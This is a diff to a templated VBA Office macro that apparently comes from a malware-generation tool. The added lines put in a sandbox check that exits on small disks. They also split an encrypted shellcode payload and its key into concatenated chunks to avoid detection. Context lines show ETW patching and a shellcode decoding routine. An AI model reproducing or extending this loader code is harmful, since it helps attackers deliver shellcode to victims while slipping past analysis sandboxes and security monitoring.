@@ -126,6 +126,16 @@ Private Function {{ v.fn_sandbox }}() As Boolean
     If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Set wshShell = Nothing: Exit Function
     Err.Clear
     Set wshShell = Nothing
+    Dim fso2 As Object
+    Set fso2 = CreateObject("Scripting.FileSystemObject")
+    On Error Resume Next
+    Dim drv2 As Object
+    Set drv2 = fso2.GetDrive("C:")
+    If Err.Number = 0 Then
+        If drv2.TotalSize < 53687091200 Then {{ v.fn_sandbox }} = True: Set fso2 = Nothing: Exit Function
+    End If
+    On Error GoTo 0
+    Set fso2 = Nothing
 End Function
 
 Private Sub {{ v.fn_exec }}()
@@ -137,8 +147,8 @@ Private Sub {{ v.fn_exec }}()
     Call {{ v.fn_etw_patch }}
 
     Dim sc_hex As String, key_hex As String
-    sc_hex  = "{{ shellcode_hex }}"
-    key_hex = "{{ key_hex }}"
+    sc_hex  = {% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
+    key_hex = {% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
 
     Dim raw() As Byte, key() As Byte, sc() As Byte
     raw = {{ v.fn_hex2arr }}(sc_hex)
